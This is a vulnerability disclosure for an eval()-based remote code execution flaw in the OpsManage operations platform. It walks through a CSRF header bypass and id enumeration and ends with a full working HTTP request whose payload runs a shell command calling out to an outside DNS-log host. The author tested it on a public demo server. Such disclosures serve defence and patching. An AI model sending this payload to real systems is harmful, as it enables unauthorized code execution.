## Summary
A **Remote Code Execution** vulnerability was found in OpsManage, which is a Automated Operations and Maintenance Platform. This vulnerability exists in the file **./apps/api/views/deploy_api.py**. In the `deploy_host_vars()` function, when this handler receives an HTTP POST request, if the **`id`** parameter results in a non-empty SQL query, the **`host_vars`** variable will accept the parameters from the request, passing external data into the `eval()` function for execution, ultimately leading to the vulnerability.

## Version
v3.0.1 ≤ version ≤ v3.0.5

## Source Code From
(OpsManage v3.0.5.tar.gz)[https://github.com/welliamcao/OpsManage/archive/refs/tags/v3.0.5.tar.gz]

## Code Analysis
In the latest version (v3.0.5), it is observed that the function `deploy_host_vars(request, id, format=None)` in the file **/apps/api/views/deploy_api.py** is an API endpoint that accepts both GET and POST requests.

The route for this handler consists of two parts, and the final complete route looks like this: `/api/host/vars/123/` (where 123 is the id).

**Part1：**
![image](https://github.com/user-attachments/assets/71e2d6ce-4398-4a86-825b-47a891f6b91f)

**Part2：**
![image](https://github.com/user-attachments/assets/0dee9673-6ac5-495b-b9bd-4c1d0cd91ad6)


In the first try..except block, the model Assets queries the **`id`** parameter to ensure that the **`id`** exists; otherwise, it will return a 404 page.
![image](https://github.com/user-attachments/assets/b15e8ce6-9e68-42b9-8dac-adadcd16ad1a)<br>
This check is easy to bypass, and I will explain the bypass method in **Trigger the vulnerability**.<br>

And then, when a POST request is made with the **`host_vars`** parameter, the variable **`host_vars`** will receive its value. The vulnerability is triggered at this point, as the value is then passed to `eval()` for execution as code.
![image](https://github.com/user-attachments/assets/d291dfdb-184d-41d4-bba2-0a9713d6bd46)

## Trigger the vulnerability
After deploying the environment locally, the process appears quite complex, making it difficult to reproduce the vulnerability. Fortunately, I discovered an official public deployment of the system, so the following process will be carried out on the public deployment.
![image](https://github.com/user-attachments/assets/73d30fae-db2b-4c68-892e-5baeb821aa79)

Log in to the system using the demo account and open the user management interface. I have already added a low-privilege, login-only user named 'host' (with the password host123) using the demo account.
![image](https://github.com/user-attachments/assets/5276db9b-4640-4d43-999e-247adb50b1ad)

Clicking the 🚫 icon on the right of the role shows the assigned permissions for that role. We can see that the 'host' user has no permissions assigned.
![image](https://github.com/user-attachments/assets/d1f3587d-1075-4d0a-b5f5-06faa21e70df)

Log in to the system using **host:host123** and simultaneously capture the **csrftoken** from the `/login/` endpoint in BurpSuite.
![image](https://github.com/user-attachments/assets/0acf6bd4-a3ce-4ce5-bfec-2b8c0e50939b)<br>
Then, obtain the **sessionid** from any other requests and record them all.

Since `/api/host/vars/123/` is a Django REST API endpoint, and OpsManage has CSRF filtering enabled by default, if you try to access it directly with the **csrftoken** from `/login/`, you will see the message **'CSRF token missing or incorrect.'**<br>
![image](https://github.com/user-attachments/assets/261670ec-4c8c-42f9-84de-8128d785e50b)<br>

I bypassed the middleware check by setting the **X-CSRFTOKEN** request header. Specifically, I set the value of **X-CSRFTOKEN** to match the **csrftoken** from the cookie.<br>
![image](https://github.com/user-attachments/assets/d09b3158-64e8-4e65-9682-70490797756d)<br>

It returned a 404 page, which means we have at least entered the endpoint's execution logic. <br>
To obtain a valid **`id`**, I used an enumeration method to check which **`id`** would return a different response.<br>
![image](https://github.com/user-attachments/assets/56710a11-2c0f-41fb-94fa-452f3867671d)<br>
Clearly, those are the ones.  

I used the `ping` command to verify the effect of command execution. After changing the **`id`** to **10** and adding the **`host_vars`** parameter with Python code, I sent the request.<br>
![image](https://github.com/user-attachments/assets/6582dcc8-2a14-45d6-a741-96e4ff462a04)<br>
In the DNS log, I can see that the domain was requested, which indicates that the code execution was successful.

## Payload
```
POST http://42.194.214.22:8000/api/host/vars/10/ HTTP/1.1
Host: 42.194.214.22:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 71
Origin: http://42.194.214.22:8000
DNT: 1
Connection: close
Referer: http://42.194.214.22:8000/login/
Cookie: csrftoken=KGkFpRkuCXci60JBgUI5nGxXcDIkifhrZBVP760X4zJtYi5H70kynu6bbiqzb036; sessionid=xodr9tlwkgteuqebiqg5gjrsmj7p02t1
Upgrade-Insecure-Requests: 1
Priority: u=0, i
X-CSRFTOKEN: KGkFpRkuCXci60JBgUI5nGxXcDIkifhrZBVP760X4zJtYi5H70kynu6bbiqzb036

host_vars=__import__('os').system('ping%20-c%201%201b4zxr.dnslog.cn')

```

## Fix Recommendations
1. Add permissions for endpoint **deploy_host_vars**
2. Filter the value of **`host_vars`** to prevent unexpected code execution.
